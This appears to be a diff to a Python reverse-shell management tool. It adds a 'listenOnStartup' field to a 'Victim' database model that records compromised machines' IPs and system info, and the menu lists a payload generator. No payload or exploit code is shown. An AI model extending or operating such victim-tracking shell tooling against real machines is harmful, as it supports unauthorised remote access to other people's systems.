@@ -3,14 +3,14 @@ import time
 import socket
 import pyperclip
 import subprocess
-import tkinter as tk
+# import tkinter as tk
 from flask import Flask
 from flask_sqlalchemy import SQLAlchemy
 
 
 Clipboard = pyperclip
 
-# Initialize Flask app (not necessary for database operations)
+# Initialize FSlask app (not necessary for database operations)
 app = Flask(__name__)
 app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///llehs.db'
 
@@ -27,6 +27,7 @@ class Victim(db.Model):
     startUpIp = db.Column(db.String(15)) # The IP address of the machine when the reverse shell was generated
     systemInfo = db.Column(db.String(100)) # The system information of the victim machine when the reverse shell was generated
     timeOfConnection = db.Column(db.DateTime)
+    listenOnStartup = db.Column(db.Boolean)
 
 # Create the application context
 with app.app_context():
@@ -55,6 +56,7 @@ def main():
     print("[5] - [P]ayload Generator")
     print("[9] - [H]elp")
     print("[0] - [E]xit\n")
+    
     while(True):
         try:
             userInput = input(": ")
